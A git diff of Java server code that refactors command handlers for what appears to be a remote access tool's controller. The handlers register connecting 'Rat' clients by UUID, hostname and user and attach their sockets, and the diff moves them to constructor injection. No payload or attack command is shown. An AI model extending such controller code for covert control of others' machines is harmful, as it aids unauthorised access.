@@ -1,19 +1,16 @@
 package ovh.wpkg.lskg.server.command.commands;
 
-import jakarta.inject.Inject;
 import jakarta.inject.Singleton;
 import lombok.extern.slf4j.Slf4j;
 import ovh.wpkg.lskg.server.command.Command;
 import ovh.wpkg.lskg.server.command.CommandContext;
 import ovh.wpkg.lskg.server.dto.RatClient;
-import ovh.wpkg.lskg.server.dto.WtpClient;
 import ovh.wpkg.lskg.server.services.RatClientPoller;
 import ovh.wpkg.lskg.server.services.ConnectedRatService;
 import ovh.wpkg.lskg.server.services.WtpClientService;
 import ovh.wpkg.lskg.server.types.out.ActionOutPayload;
 import ovh.wpkg.lskg.services.rat.RatInfoService;
 import ovh.wpkg.lskg.services.users.UserService;
-
 import java.util.ArrayList;
 import java.util.UUID;
 
@@ -22,20 +19,20 @@ import java.util.UUID;
 @SuppressWarnings("unused")
 public class DefaultCommands {
 
-    @Inject
-    public WtpClientService wtpClientService;
+    private final WtpClientService wtpClientService;
+    private final ConnectedRatService connectedRatService;
+    private final UserService userService;
+    private final RatClientPoller ratClientPoller;
+    private final RatInfoService ratInfoService;
 
-    @Inject
-    public ConnectedRatService connectedRatService;
-
-    @Inject
-    public UserService userService;
-
-    @Inject
-    private RatClientPoller ratClientPoller;
-
-    @Inject
-    private RatInfoService ratInfoService;
+    public DefaultCommands(WtpClientService wtpClientService, ConnectedRatService connectedRatService,
+                           UserService userService, RatClientPoller ratClientPoller, RatInfoService ratInfoService) {
+        this.wtpClientService = wtpClientService;
+        this.connectedRatService = connectedRatService;
+        this.userService = userService;
+        this.ratClientPoller = ratClientPoller;
+        this.ratInfoService = ratInfoService;
+    }
 
     @Command(name = "hello")
     public ActionOutPayload hello(CommandContext context) {
@@ -60,9 +57,7 @@ public class DefaultCommands {
 
             ratInfoService.registerRat(userService.findUserById(1L), uuid, hostname, user);
 
-            var wtpClient = wtpClientService.getClient(context.getWtpClient().getChannel());
-
-            connectedRatService.addClient(new RatClient(wtpClient, uuid, user, hostname, new ArrayList<>()));
+            connectedRatService.addClient(new RatClient(context.getWtpClient(), uuid, user, hostname, new ArrayList<>()));
 
             return context.response(0,"Registered client " + user + " " + hostname + " has been added!");
         } catch (Exception e) {
@@ -83,11 +78,10 @@ public class DefaultCommands {
             if (rat == null)
                 return context.response(1, "No entity found for UUID: " + uuid);
 
-            WtpClient wtpClient = new WtpClient(context.getWtpClient().getChannel());
-            rat.getSockets().add(wtpClient);
+            rat.getSockets().add(context.getWtpClient());
 
-            // Emit new WTP client id to ratClientPoller
-            ratClientPoller.getClientSink().tryEmitNext(context.getWtpClient().id());
+            // Notify that new client was registered
+            ratClientPoller.notifyRegistered(context.getWtpClient());
 
             return context.response(0, "Socket successfully added!");
         } catch (IllegalArgumentException e) {
